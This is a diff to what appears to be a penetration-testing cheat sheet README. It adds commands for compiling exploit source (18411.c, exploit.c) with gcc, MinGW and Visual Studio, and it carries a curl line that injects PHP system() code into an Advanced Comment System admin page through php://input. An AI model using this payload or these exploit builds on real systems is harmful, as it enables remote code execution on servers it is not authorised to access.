@@ -4,6 +4,18 @@ The following collection is a wild (but structured) selection of commands, snipp
 
 **THIS IS WORK IN PROGRESS**
 
+gcc -m32 -Wl,--hash-style=both -o exploit 18411.c 
+Standalone GCC compiler (If machine does not have GCC)
+chmod (file) 	- 	change file perms to be able to execute
+
+
+Mingw:
+ i686-w64-mingw32- gcc(g++) exploit.c -o exploit -lws2_32
+
+in case mingw32 does not support the code such as "__try" , compile in a windows vm:
+Visual Studio Developer Command Line  (Developer Command Prompt for VS )
+cl ex.cpp /link kernel32.lib shell32.lib user32.lib  
+
 curl -s --data "<?system('ls -la');?>" "http://www.site/path/advanced_comment_system/admin.php?ACS_path=php://input%00"
 
 ## Disclaimer
